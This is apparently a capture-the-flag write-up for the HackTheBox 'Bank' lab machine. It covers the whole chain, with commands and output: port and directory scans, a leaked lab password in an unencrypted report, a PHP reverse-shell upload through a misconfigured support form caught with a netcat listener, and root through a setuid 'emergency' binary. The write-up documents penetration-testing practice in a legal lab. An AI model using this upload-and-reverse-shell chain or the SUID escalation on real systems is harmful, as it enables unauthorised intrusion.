+++
name = "Bank"
published_date = 2020-05-30T18:30:00Z
tags = []

+++
### Initial enumeration

```bash
# Nmap 7.80 scan initiated Sat Sep 28 21:42:44 2019 as: nmap -sV -sC -O -A -oN O-Detailed -p 80,53,22,U:53 10.10.10.29
Nmap scan report for 10.10.10.29
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   220.12 ms 10.10.14.1
2   229.82 ms 10.10.10.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 28 21:43:08 2019 -- 1 IP address (1 host up) scanned in 24.59 seconds
```

Going to `http://10.10.10.29` got me the default Apache server page, but as we see there's a `DNS` server running on `port 53` so I added an entry for `bank.htb` in my hosts file and when visiting the address `http://bank.htb` we get a login page. No usual login credentials seemed to work, so I ran `dirsearch` on the URL and got following directories.

```bash
$ sudo dirsearch -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -r -t 200 --simple-report=dirsearch.output
http://bank.htb:80/.php
http://bank.htb:80/index.php
http://bank.htb:80/support.php
http://bank.htb:80/icons/
http://bank.htb:80/login.php
http://bank.htb:80/uploads/
http://bank.htb:80/assets/
http://bank.htb:80/logout.php
http://bank.htb:80/inc/
http://bank.htb:80/server-status/
## --------------------------------- ##
http://bank.htb:80/balance-transfer/
## --------------------------------- ##
http://bank.htb:80/icons/.php
http://bank.htb:80/icons/small/
```

The URL `/balance-transfer/` stood out to me, so I went ahead and explored the directory and found that there are several hundred files and all are encrypted however there's one file whose size is lesser than all the other files.

![](../../../.gitbook/assets/image%20%2850%29.png)

The contents of the file revealed credentials for an account on the system.

```bash
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

So we used the credentials to get to the dashboard.

![Dashboard](../../../.gitbook/assets/image%20%2844%29.png)

There seemed to be another page called `support.php` which seemed interesting as it had a file upload capability \(These are always juicy.\).

![Support](../../../.gitbook/assets/image%20%2831%29.png)

Looking at the source revealed that we can upload file with extension `htb` and have it run as `PHP` code, which as sweet.

![](../../../.gitbook/assets/image%20%2858%29.png)

So I used the `/usr/share/webshells/php/php-reverse-shell.php` from the `kali` repository and uploaded and from the `My Tickets` table opened up the file and caught the reverse shell with `netcat`.

### User own

```bash
$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.29] 44018
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 i686 i686 GNU/Linux
 20:37:39 up  1:37,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ cd chris
$ cat user.txt
37c97***
```

### Root own

I ran `linux smart enum` on the system and found some interesting things about `SUID` binaries.

{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}

```bash
[*] fst010 Binaries with setuid bit........................................ yes!
---
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
---
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/var/htb/bin/emergency
---
```

So I went ahead and ran the uncommon binary and found that it dropped us into the root shell.

```bash
$ cd /var/htb/bin/                                                                                                                                     
$ ls -la          
total 120         
drwxr-xr-x 2 root root   4096 Jun 14  2017 .                                
drwxr-xr-x 3 root root   4096 Jun 14  2017 ..                               
-rwsr-xr-x 1 root root 112204 Jun 14  2017 emergency                        
$ ./emergency     
id                
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)  
cat /root/root.txt
d5be5***
```

### Learning outcome

Directory scans play a very important role in success with web-servers.